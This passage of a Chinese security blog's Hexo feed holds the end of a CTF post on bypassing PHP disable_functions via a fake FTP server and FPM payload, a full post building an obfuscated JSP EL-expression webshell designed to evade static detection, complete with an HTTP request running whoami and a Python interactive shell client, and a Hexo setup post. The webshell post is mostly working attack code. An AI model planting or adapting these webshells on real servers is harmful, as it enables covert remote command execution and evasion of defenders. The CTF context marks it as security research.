class="hljs-string">&quot;226 Transfer complete.\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;221 Goodbye.\r\n&quot;</span>);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&quot;[+] completed ~~\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$socket</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问脚本跑起来之后其余步骤与出网相同，不再赘述</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso">POST /ftp.php?url=ftp:<span class="hljs-comment">//127.0.0.1:9999/code.txt HTTP/1.1</span><br><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><br>payload=&lt;恶意fpm流量&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
      <tag>RceBypass</tag>
      
      <tag>bypass open_basedir</tag>
      
      <tag>bypass disable_functions</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>新型EL webshell初探</title>
    <link href="/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/"/>
    <url>/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="从DesperateCat到EL-webshell初探"><a href="#从DesperateCat到EL-webshell初探" class="headerlink" title="从DesperateCat到EL webshell初探"></a>从DesperateCat到EL webshell初探</h1><h2 id="0x00-RWCTF引发的思考"><a href="#0x00-RWCTF引发的思考" class="headerlink" title="0x00 RWCTF引发的思考"></a>0x00 RWCTF引发的思考</h2><pre><code class="hljs">前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：</code></pre><ul><li><p><strong>禁止传入圆括号、尖括号、引号等</strong>。</p><p>  如果我们单独处理bypass，那么其实很好解决：</p></li></ul><ol><li>尖括号 &lt;% %&gt;：使用EL表达式</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime.exec(request.getParameter(&quot;cmd&quot;));%&gt;</span><br><span class="hljs-comment">//替换成为</span><br>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>这样就避免出现了尖括号。</p><p>2.圆括号 () : java 代码编译解析器会识别 Unicode 形式的编码，所可以直接unicode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime().exec(&quot;calc&quot;);%&gt;</span><br>&lt;%\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%&gt;<br></code></pre></td></tr></table></figure><p>但是要完全bypass，显然两者都是不行的，那么最终的方式是采用EL表达式中的 <strong>‘.’</strong> 与 <strong>‘&#x3D;’</strong>  。</p><ul><li><strong>EL中 . 点号属性取值相当于执行对象的 getter 方法，</strong>&#x3D; <strong>赋值则等同于执行 setter 方法。</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;<br><span class="hljs-comment">//等同于</span><br>pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter(<span class="hljs-string">&quot;a&quot;</span>));<br></code></pre></td></tr></table></figure><p>通过这种方式我们可以获得ClassLoader修改一些tomcat的属性，最终达到利用session写shell的目的，当然到目前这道题目只是完成了一小部分，后面还涉及到如何使Tomcat reload 并实现持久化贮存session的问题等等，各位感兴趣的可以看一下长亭官方的wp。</p><pre><code class="hljs">**这道题目使用EL表达式进行bypass的方式引起了我的注意，通过精心构造EL表达式我们是否能实现更加精简且具有一定bypass能力的jsp webshell？**</code></pre><h2 id="0x01-简单尝试与回显问题"><a href="#0x01-简单尝试与回显问题" class="headerlink" title="0x01 简单尝试与回显问题"></a>0x01 简单尝试与回显问题</h2><p>我们使用开头提到的EL表达式来试一试：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png" alt="image-20220907140149065"></p><p>执行是没有问题的，但是我们要制作webshell，没有回显是肯定不行的，这里我联想到了前段时间学习webshell免杀的一种构造方式：<strong>调用ScriptEngine来执行js</strong>。</p><blockquote><p>我们使用ScriptEngine构造出的webshell是这样的：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br> <span class="hljs-type">String</span> s = <span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=&#x27;&quot;</span>;<br> <span class="hljs-type">String</span> cmd = request.<span class="hljs-built_in">getParameter</span>(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <span class="hljs-type">String</span> rt = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(Base64.<span class="hljs-built_in">getDecoder</span>().<span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;</span>));<br> <span class="hljs-built_in">Process</span> process = (<span class="hljs-built_in">Process</span>) <span class="hljs-keyword">new</span> <span class="hljs-built_in">ScriptEngineManager</span>().<span class="hljs-built_in">getEngineByName</span>(<span class="hljs-string">&quot;nashorn&quot;</span>).<span class="hljs-built_in">eval</span>(s + cmd + rt);<br> InputStreamReader reader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">InputStreamReader</span>(process.<span class="hljs-built_in">getInputStream</span>());<br> BufferedReader buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BufferedReader</span>(reader);<br> s = null;<br> <span class="hljs-keyword">while</span> ((s = buffer.<span class="hljs-built_in">readLine</span>()) != null) &#123;<br>     response.<span class="hljs-built_in">getWriter</span>().<span class="hljs-built_in">println</span>(s);<br> &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>很好理解，获取nashorn JavaScript引擎实现命令执行。</p></blockquote><p>想到这种方法是因为我们可以尽可能的减少webshell中的代码量，通过传递指定的js代码来执行脚本，从而更好地绕过文件内容检测。</p><h2 id="0x02-EL-ScriptEngine"><a href="#0x02-EL-ScriptEngine" class="headerlink" title="0x02 EL + ScriptEngine"></a>0x02 EL + ScriptEngine</h2><p>首先我们在webshell中通过反射配合动态传递参数的方式获取Engine并执行eval。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//test.jsp</span><br>$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>首先反射获取ScriptEngineManager对象：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">test.jsp?<span class="hljs-attribute">spr1</span>=javax.script.ScriptEngineManager<br></code></pre></td></tr></table></figure><p>然后调用js引擎执行脚本，我们将上方给出的ScriptEngine版本的webshell进行改造，将其改造成js版本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">try&#123;<br>    load(<span class="hljs-string">&quot;nashorn:mozilla_compat.js&quot;</span>);<br>&#125;<br>catch (e)&#123;<br>&#125;<br>importPackage(Packages.java.util);<br>importPackage(Packages.java.lang);<br>importPackage(Packages.java.io);<br>s=[2];<br>s[0]=<span class="hljs-string">&#x27;cmd&#x27;</span>;<br>s[1]=<span class="hljs-string">&#x27;/c whoami /all&#x27;</span>;<br><span class="hljs-attribute">a</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-attribute">b</span>=java.lang.Runtime.getRuntime().exec(s).getInputStream();<br>output+=new BufferedReader(new+InputStreamReader(b));<br><span class="hljs-keyword">while</span> ((<span class="hljs-attribute">line</span>=output.readLine()) != <span class="hljs-literal">null</span>) <br>&#123;<br>    <span class="hljs-attribute">o</span>=o+line+&quot;\n&quot;<br>&#125;;o<br></code></pre></td></tr></table></figure><p>然后我们将其传入执行js，最终的包长这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/test.jsp?spr1=javax.script.ScriptEngineManager</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.20.10.2:8080<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=4A34A77B78CD48404804BFD7420A0195<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>414<br><br><span class="language-xquery">spr2=<span class="hljs-keyword">try</span>&#123;load(<span class="hljs-string">&quot;nashorn%3amozilla_compat.js&quot;</span>)<span class="hljs-meta">%3b</span>&#125;<span class="hljs-keyword">catch</span>(e)&#123;&#125;importPackage(Packages.java.util)<span class="hljs-meta">%3bimportPackage</span>(Packages.java<span class="hljs-built_in">.lang</span>)<span class="hljs-meta">%3bimportPackage</span>(Packages.java.io)<span class="hljs-meta">%3bs</span><span class="hljs-meta">%3d</span>[<span class="hljs-number">2</span>]<span class="hljs-meta">%3bs</span>[<span class="hljs-number">0</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;cmd&#x27;</span><span class="hljs-meta">%3bs</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;/c+whoami&#x27;</span><span class="hljs-meta">%3ba</span><span class="hljs-meta">%3d</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-meta">%3bb</span><span class="hljs-meta">%3djava</span><span class="hljs-built_in">.lang</span>.Runtime.getRuntime().exec(s).getInputStream()<span class="hljs-meta">%3boutput</span>+<span class="hljs-meta">%3d</span>+new+BufferedReader(new+InputStreamReader(b))<span class="hljs-meta">%3bwhile</span>+((line<span class="hljs-meta">%3doutput</span>.readLine())+!<span class="hljs-meta">%3d</span>+null)+&#123;a<span class="hljs-meta">%3da</span><span class="hljs-meta">%2bline</span><span class="hljs-meta">%2b</span><span class="hljs-string">&quot;\n&quot;</span>&#125;<span class="hljs-meta">%3ba</span></span><br></code></pre></td></tr></table></figure><p>然后执行，没有问题。</p><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png" alt="image-20220907140219279"></p><h2 id="0x03-进一步混淆"><a href="#0x03-进一步混淆" class="headerlink" title="0x03 进一步混淆"></a>0x03 进一步混淆</h2><p>虽然已经可以通过传递指定js脚本执行命令，但仔细来看</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>这段代码还是包含了一些较为敏感的关键字，譬如forName、getEngineByName、eval等，作为一个webshell来讲，显然是不够“干净整洁”的；为进一步混淆，我们可以采用动态传递的方式来替换关键字。</p><p>在EL表达式中，我们知道获取属性可以使用a.b或者a[‘b’]，使用后者就意味着我们可以把所有属性和方法转化成字符串：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getClass&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;forName&quot;</span>]</span>(&quot;javax.script.ScriptEngineManager&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;newInstance&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getEngineByName&quot;</span>]</span>(&quot;JavaScript&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;eval&quot;</span>]</span>(&quot;...&quot;)&#125;<br></code></pre></td></tr></table></figure><p>那么这样做有什么好处呢？</p><p>首先我们可以随意拼接：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;ge&quot;</span>+<span class="hljs-string">&quot;tCl&quot;</span>+<span class="hljs-string">&quot;ass&quot;</span>]()[<span class="hljs-string">&quot;for&quot;</span>+<span class="hljs-string">&quot;Name&quot;</span>](<span class="hljs-string">&quot;javax.scr&quot;</span>+<span class="hljs-string">&quot;ipt.ScriptEng&quot;</span>+<span class="hljs-string">&quot;ineManager&quot;</span>)[<span class="hljs-string">&quot;newIn&quot;</span>+<span class="hljs-string">&quot;stance&quot;</span>]()[<span class="hljs-string">&quot;getEng&quot;</span>+<span class="hljs-string">&quot;ineByName&quot;</span>](<span class="hljs-string">&quot;java&quot;</span>+<span class="hljs-string">&quot;script&quot;</span>)[<span class="hljs-string">&quot;e&quot;</span>+<span class="hljs-string">&quot;val&quot;</span>](<span class="hljs-string">&quot;...&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>更重要的是如此我们可以将字符串通过param.xxx来传递，这样就会实现如下的改造：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure><p>测试后可以执行：</p><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220902101416244.png" alt="image-20220902101416244"></p><p>这种高度精简就实现了将绝大部分代码通过传递来执行，应当具有较好的静态免杀能力。</p><h2 id="0x04-小总结"><a href="#0x04-小总结" class="headerlink" title="0x04 小总结"></a>0x04 小总结</h2><p>这个小思路也是启发于星球里的师傅，同时也想到了之前的RWCTF中的题目，而从本质上讲也许可以把它看作是EL表达式注入的变种。</p><p>我们从最初的</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>到</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(param.spr1)<span class="hljs-selector-class">.newInstance</span>()<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&quot;javascript&quot;</span>)<span class="hljs-selector-class">.eval</span>(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>再到</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure><p>可以发现这种webshell的优势也很明显：</p><ul><li><strong>足够小，一句话就可以实现命令执行+回显的功能</strong>。</li><li><strong>避免出现&lt;%、Class、eval等敏感字符，具有bypass能力</strong>。</li></ul><p>当然这只是个demo，它还可以更美观比如将cmd通过占位符提取出来放到headers里；再比如我们的body有点臃肿，我们直接用python封装实现一个交互式shell也不错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#shell_mananger:</span><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>(<span class="hljs-params">cmd:<span class="hljs-built_in">str</span>,is_linux:<span class="hljs-built_in">bool</span></span>):<br>    PROXY=&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8081&quot;</span>&#125;<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:8080/test.jsp&quot;</span><br><br>    headers=&#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36&quot;</span>,<br><br>        &#125;<br><br>    params=&#123;<br>        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;getClass&quot;</span>,<br>        <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-string">&quot;forName&quot;</span>,<br>        <span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>,<br>        <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;newInstance&quot;</span>,<br>        <span class="hljs-string">&quot;e&quot;</span>:<span class="hljs-string">&quot;getEngineByName&quot;</span>,<br>        <span class="hljs-string">&quot;f&quot;</span>:<span class="hljs-string">&quot;javascript&quot;</span>,<br>        <span class="hljs-string">&quot;g&quot;</span>:<span class="hljs-string">&quot;eval&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> is_linux:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;/bin/bash&#x27;;s[1]=&#x27;-c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br><br>    data=&#123;<br>        <span class="hljs-string">&quot;h&quot;</span>: payload<br>        <span class="hljs-comment">#注意这里换行符要对\多转义一次防止py解析</span><br>    &#125;<br>    <span class="hljs-comment"># print(data)</span><br>    res=requests.post(url=url, headers=headers,params=urllib.parse.urlencode(params),<br>                        data=urllib.parse.urlencode(data),proxies=<span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> res.text<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    check=<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-keyword">in</span> check:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/09/12/hello-world/"/>
    <url>/2022/09/12/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem 1"></a>problem 1</h3><p>使用了图床插件，生成时会自动将图片复制到<blogname>文件夹下，但仍需要修改图片地址</p><p>将图片全部移动至_post文件夹下，注意md中图片的地址需要加上日期，如下形式：</p><p>.&#x2F;2022&#x2F;09&#x2F;12&#x2F;新型EL-webshell初探&#x2F;image-20220907140219279.png</p><p>{filennam}&#x2F;pic_id.png</p><p><strong>注意用斜杠而非反斜杠</strong></p><h3 id="problem2"><a href="#problem2" class="headerlink" title="problem2"></a>problem2</h3><p>有时候使用花括号{}等会出现字符转义失败</p><p>修复见：<a href="https://coding.f10.org/HEXO/%E4%BF%AE%E5%A4%8Dhexo%E8%8A%B1%E6%8B%AC%E5%8F%B7%E6%98%BE%E7%A4%BA%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2123%E5%92%8C125/">https://coding.f10.org/HEXO/%E4%BF%AE%E5%A4%8Dhexo%E8%8A%B1%E6%8B%AC%E5%8F%B7%E6%98%BE%E7%A4%BA%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2123%E5%92%8C125/</a></p><p>修复文件：node_modules\highlight.js\lib\core.js#57修改为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"> <span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHTML</span>(<span class="hljs-params">value</span>) &#123;<br>  <span class="hljs-keyword">return</span> value<br>    .<span 